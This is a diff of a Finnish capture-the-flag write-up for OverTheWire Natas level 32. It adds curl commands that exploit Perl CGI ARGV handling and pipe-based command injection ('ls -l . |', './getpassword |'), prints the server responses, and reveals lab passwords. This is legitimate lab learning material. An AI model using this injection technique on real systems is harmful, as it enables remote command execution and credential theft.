@@ -489,9 +489,13 @@ Pientä yksityiskohtaa:
 
 Kali linux tarkistusta
 
-Muutama ja pientä curl komentojen tarkistusta:
+Muutama ja pientä curl komentojen tarkistusta, että on pohja komentoja:
 
+```
+curl http://natas32.natas.labs.overthewire.org/ --user natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
 
+$curl -Headers "Referer: http://natas33.natas.labs.overthewire.org/" http://natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B@natas32.natas.labs.overthewire.org
+```
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -644,14 +648,271 @@ curl: (3) URL rejected: Malformed input to a URL function
 
 ---
 
-Tämä on se aikaisempi komento natas31:stä, mutta pientä muutosta ja ohjeiden mukaan haettu ja testataan. tässä tapahtui siis curl mikä käyttis (`-u`) username:password, sitten nettisivuston url ja polku /etc/ josta haettaan seuraava natas33:sen salasanansa. File ARGV joka on se suorittaa ohjauksensa *PERL CGI:tä* käyttämällä komentoriviparametriä tähän tiedostoa ja haluamme kokeilla uudestaan tätä olemassa olevaa excel tauluko tiedoston upottamisen injektiota.
+Tämä on se aikaisempi komento natas31:stä, mutta pientä muutosta ja ohjeiden mukaan haettu ja testataan. tässä tapahtui siis curl mikä käyttis (`-u`) username:password, sitten nettisivuston url ja polku /etc/ josta haettaan seuraava natas33:sen salasanansa. File ARGV joka on se suorittaa ohjauksensa **PERL CGI:tä** käyttämällä komentoriviparametriä tähän tiedostoa ja haluamme kokeilla uudestaan tätä olemassa olevaa excel tauluko tiedoston upottamisen injektiota.
 
 - URL-osoitteessa viitataan /etc/-hakemistoon ja yritetään hakea seuraavan tason (natas33) salasanaa.
 - Tiedostonimessä käytetään ARGV, joka ohjaa Perl CGI -skriptiä käyttämään sitä komentoriviparametrina.
+- Tarkoitus on kokeilla uudelleen tätä aikaisemmin toiminutta tiedoston upottamiseen perustuvaa injektiota, jossa käytetään valmiina olevaa Excel-muotoista CSV-tiedostoa.
+  - tämän testauksen (alemman komennon) jälkeen se ei anna sitä seuraavaa natas33:sen salasanaa, mutta hyvä testata ja kokeillakin.
 
 ```
-curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas33" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas33" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- 
+    morla/10111 
+    shouts to Netanel Rubin    
+-->
+
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas32</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
 ```
+
+
+**Eteenpäin**:
+
+```
+curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?ls%20-l%20.%20|" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
+```
+
+Nyt tässä suoritettiin sama kuin aikaisempi komento, mutta kummottiin jälkimmäisestä osasta kuin `index.pl?` eteenpäin jossa sijoitetin jotakin **linux komentojen injection parametriä**. 
+
+Tulostuksena ainakin näyttävän Linux kirjastojen/tiedostojen oikeuksia, root ja jne, että koska luotu ja aika ja tässä osassa meitä kiinnostaa `</td></tr><tr><td>-rwsrwx--- 1 root    natas32 16096 Aug 15 13:06 getpassword`
+
+- `ls%20-l%20.%20|`, joka vastaa komentoa `ls -l .`
+- Tämä näyttää nykyisen hakemiston sisällön pitkällä listauksella (mm. tiedosto-oikeudet ja omistajat). Tällä varmistan, että komentojen suoritus toimii ja että getpassword-tiedosto on olemassa ja SUID-root.
+- Sama kuin linux ympäristössä kun syöttää komennon `$ls` - niin tarkistaa tämän polun hakemiston tiedostoa ja oikeutta.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?ls%20-l%20.%20|" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- 
+    morla/10111 
+    shouts to Netanel Rubin    
+-->
+
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas32</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>.:
+</th></tr><tr><td>total 156
+</td></tr><tr><td>drwxr-x--- 5 natas32 natas32  4096 Aug 15 13:06 bootstrap-3.3.6-dist
+</td></tr><tr><td>-rwsrwx--- 1 root    natas32 16096 Aug 15 13:06 getpassword
+</td></tr><tr><td>-rw-r--r-- 1 root    root     9740 Aug 15 13:06 index-source.html
+</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32  2968 Aug 15 13:06 index.pl
+</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 97180 Aug 15 13:06 jquery-1.12.3.min.js
+</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 16877 Aug 15 13:06 sorttable.js
+</td></tr><tr><td>drwxr-x--- 2 natas32 natas32  4096 Sep 14 13:03 tmp
+</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+
+Nyt alkoi pelittää, koska aikaisemmassa (ylempi komento) testauksessa , niin meitä kiinnostaa toi polku **(./getpassword)** niin tähän polkuun url `/index.pl?` jälkeen pitää vähä rakentaa, jotta se alkaa pelittää siksi mentiin näin.
+
+Tässä koskien tätä polku hakemistoa **(./getpassword)** - miksi suoritettiin näin: `./getpassword%20|` vs `./getpassword`
+- %20 tarkoittaa välilyöntiä (spaec) URL muodossa ja se on URL enkoodattu siksi menee näin ja mukaan jos shellissä menisi näin `./getpassword |`
+- Putki osalta tarkoittaa komennon ulostulon eteenpäin - ja todennäköisesti CGI skriptin kautta näkyviin.
+- Putki on tärkeä osa, koska Unix-shellissä ja se ohjaa vasemman puolen komennon ulostulon oikean puolen syötteeksi.
+
+Entä jos `./getpassword` ja ilman %`20|` ei toimi näkyvästi?
+- silloin skripti saattaa tuoda mahdollisesti suorittaa binääri muodossa
+- tulos ei ohjaudu näkyviin, vaan menee prosessiin tai jää hukkaan
+- binääri **saattaa tulostaa binääristä dataa**, mikä voi aiheuttaa terminaaliin syntax error virhe ilmoituksena näin `Warning: Binary output can mess up your terminal...` ja curl varoittaa, että tulos ei ole tavallista tekstiä.
+- Nyt tässä tulostuu se virallinen vastaus.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- 
+    morla/10111 
+    shouts to Netanel Rubin    
+-->
+
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas32</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
+</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
